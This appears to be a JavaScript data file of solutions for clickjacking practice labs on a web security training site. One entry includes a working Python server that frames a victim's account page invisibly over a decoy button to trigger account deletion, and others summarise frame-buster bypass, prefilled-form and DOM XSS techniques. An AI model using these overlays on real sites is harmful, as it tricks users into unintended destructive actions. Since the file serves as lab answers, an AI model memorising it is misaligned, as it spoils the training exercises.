export default {
  'clickjacking-lab-basic-csrf-protected': {
    note: 'The account page can be framed; overlay a decoy button on the "Delete account" control so the click is real.',
    work: {
      hints: [
        'Confirm the target page can be framed: load it in an iframe and check for `X-Frame-Options` or `frame-ancestors`.',
        'The delete button sits at a fixed position on `/my-account`. You need the victim to click that coordinate.',
        'Frame the page with near-zero opacity and place a decoy button underneath at the same position.'
      ],
      approach:
        'UI redressing. The CSRF token protects against forged requests, but this is not a forged request: the victim genuinely clicks the real button in a real session. Framing is the vulnerability; the overlay only aims the click.',
      request: `GET /my-account HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=VICTIM-SESSION

HTTP/1.1 200 OK
(no X-Frame-Options, no frame-ancestors)`,
      tokens: [
        ['<iframe src=...>', 'Embeds the authenticated page. The browser sends the victim\'s cookies because it is a normal frame request.'],
        ['opacity: 0.0001', 'Keeps the frame rendered and hit-testable while making it invisible to the victim.'],
        ['position: absolute', 'Places the decoy and the frame in the same coordinate space.'],
        ['z-index', 'Controls which layer receives the click; the iframe must be on top.'],
        ['(decoy button)', 'What the victim believes they are clicking; the click actually lands on the framed control.']
      ],
      script: `import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

host = sys.argv[1]
page = f'''<html><head><style>
  iframe {{ position:relative; width:800px; height:600px; opacity:0.0001; z-index:2; }}
  .decoy {{ position:absolute; top:480px; left:80px; z-index:1; padding:12px 20px; }}
</style></head><body>
<div class="decoy">Win a prize</div>
<iframe src="https://{host}/my-account"></iframe>
</body></html>'''

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(page.encode())

HTTPServer(("0.0.0.0", 8000), H).serve_forever()`
    }
  },
  'clickjacking-lab-prefilled-form-input': {
    note: 'The email-change form prefills from a URL parameter; frame it with the attacker email already filled, then one click submits.'
  },
  'clickjacking-lab-frame-buster-script': {
    note: 'A JavaScript frame buster runs on load; sandbox the iframe without `allow-scripts` so the buster never executes.'
  },
  'clickjacking-lab-exploiting-to-trigger-dom-based-xss': {
    note: 'The framed page has a DOM XSS sink; put the payload in the frame URL and use the click as user activation.'
  },
  'clickjacking-lab-multistep': {
    note: 'The deletion flow has two confirmations; align two decoys or use the first step\'s GET-on-load to reduce it to one click.'
  }
}
